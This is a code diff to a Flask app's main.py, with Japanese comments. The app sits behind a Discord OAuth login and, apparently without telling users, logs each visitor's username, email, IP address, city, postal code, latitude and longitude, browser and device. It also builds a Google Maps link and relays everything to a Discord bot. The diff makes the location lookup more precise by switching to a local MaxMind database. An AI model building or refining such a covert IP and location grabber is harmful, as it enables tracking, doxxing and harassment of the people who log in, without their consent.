@@ -1,3 +1,4 @@
+# main.py
 import os
 import json
 import threading
@@ -7,6 +8,7 @@ from flask import Flask, request, render_template
 from user_agents import parse
 from dotenv import load_dotenv
 from discord_bot import bot, enqueue_task
+import geoip2.database
 
 load_dotenv()
 app = Flask(__name__)
@@ -15,46 +17,49 @@ ACCESS_LOG_FILE = "access_log.json"
 DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
+GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")  # MaxMind GeoLite2 DB
 
-# 自宅付近の固定緯度経度（さいたま市例）
-FIXED_LAT = 35.9
-FIXED_LON = 139.6
-
+# =========================
+# IP から正確な位置情報を取得
+# =========================
+def get_geo_info(ip):
+    try:
+        reader = geoip2.database.Reader(GEOIP_DB_PATH)
+        response = reader.city(ip)
+        geo = {
+            "ip": ip,
+            "country": response.country.name or "不明",
+            "region": response.subdivisions.most_specific.name or "不明",
+            "city": response.city.name or "不明",
+            "zip": response.postal.code or "不明",
+            "lat": response.location.latitude,
+            "lon": response.location.longitude,
+            "proxy": False,  # MaxMind で判定する場合は追加可能
+            "hosting": False  # MaxMind で判定する場合は追加可能
+        }
+        reader.close()
+        return geo
+    except:
+        return {
+            "ip": ip,
+            "country": "不明",
+            "region": "不明",
+            "city": "不明",
+            "zip": "不明",
+            "lat": None,
+            "lon": None,
+            "proxy": False,
+            "hosting": False
+        }
 
 def get_client_ip():
     if "X-Forwarded-For" in request.headers:
         return request.headers["X-Forwarded-For"].split(",")[0].strip()
     return request.remote_addr
 
-
-def get_geo_info(ip):
-    try:
-        res = requests.get(
-            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,regionName,city,zip,isp,as,proxy,hosting,query"
-        )
-        data = res.json()
-        return {
-            "ip": data.get("query"),
-            "country": data.get("country", "不明"),
-            "region": data.get("regionName", "不明"),
-            "city": data.get("city", "不明"),
-            "zip": data.get("zip", "不明"),
-            "isp": data.get("isp", "不明"),
-            "as": data.get("as", "不明"),
-            "proxy": data.get("proxy", False),
-            "hosting": data.get("hosting", False),
-            "lat": FIXED_LAT,
-            "lon": FIXED_LON,
-        }
-    except:
-        return {
-            "ip": ip, "country": "不明", "region": "不明",
-            "city": "不明", "zip": "不明", "isp": "不明", "as": "不明",
-            "proxy": False, "hosting": False,
-            "lat": FIXED_LAT, "lon": FIXED_LON
-        }
-
-
+# =========================
+# アクセスログ保存
+# =========================
 def save_log(discord_id, data):
     now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     if os.path.exists(ACCESS_LOG_FILE):
@@ -72,7 +77,9 @@ def save_log(discord_id, data):
     with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
 
-
+# =========================
+# Flask ルート
+# =========================
 @app.route("/")
 def index():
     discord_auth_url = (
@@ -88,6 +95,7 @@ def callback():
     if not code:
         return "コードがありません", 400
 
+    # Discord OAuth2 トークン取得
     data = {
         "client_id": DISCORD_CLIENT_ID,
         "client_secret": DISCORD_CLIENT_SECRET,
@@ -112,50 +120,33 @@ def callback():
 
     log_data = {
         "username": f"{user.get('username')}#{user.get('discriminator')}",
-        "id": user.get("id"),
         "email": user.get("email"),
-        "premium": user.get("premium_type", 0),
-        "locale": user.get("locale", "不明"),
         "ip": geo["ip"],
+        "country": geo["country"],
         "region": geo["region"],
         "city": geo["city"],
         "zip": geo["zip"],
-        "country": geo["country"],
-        "isp": geo["isp"],
-        "as": geo["as"],
-        "proxy": geo["proxy"],
-        "hosting": geo["hosting"],
-        "browser": f"{ua.browser.family} {ua.browser.version_string}",
-        "os": ua.os.family,
-        "device": ua.device.family,
-        "bot": False,
         "lat": geo["lat"],
         "lon": geo["lon"],
-        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"
+        "proxy": geo["proxy"],
+        "browser": f"{ua.browser.family} {ua.browser.version_string}",
+        "os": f"{ua.os.family} {ua.os.version_string}",
+        "device": ua.device.family,
+        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
     }
 
     save_log(user.get("id"), log_data)
 
-    # Discord Bot に安全に送信
-    enqueue_task(embed_data={
-        "title": "✅ 新しいアクセスログ",
-        "description": f"名前: {log_data['username']}\nID: {log_data['id']}\nメール: {log_data['email']}\n"
-                       f"Premium: {log_data['premium']} / Locale: {log_data['locale']}\n"
-                       f"IP: {log_data['ip']} / Proxy: {log_data['proxy']} / Hosting: {log_data['hosting']}\n"
-                       f"国: {log_data['country']} / {log_data['region']} / {log_data['city']} / {log_data['zip']}\n"
-                       f"ISP: {log_data['isp']} / AS: {log_data['as']}\n"
-                       f"UA: {request.headers.get('User-Agent')}\n"
-                       f"OS: {log_data['os']} / ブラウザ: {log_data['browser']}\n"
-                       f"デバイス: {log_data['device']} / Bot判定: {log_data['bot']}\n"
-                       f"📍 地図リンク: {log_data['map_link']}"
-    }, user_id=user.get("id"))
+    # Bot にタスク送信
+    enqueue_task(embed_data={"title": "新規アクセス", "description": f"{log_data}"}, user_id=user.get("id"))
 
-    return render_template("welcome.html", username=log_data["username"])
+    return render_template("welcome.html", username=log_data["username"], log=log_data)
 
-
+# =========================
+# Bot スレッド起動
+# =========================
 def start_bot_thread():
     threading.Thread(target=lambda: bot.run(os.getenv("DISCORD_BOT_TOKEN")), daemon=True).start()
-
 
 if __name__ == "__main__":
     start_bot_thread()
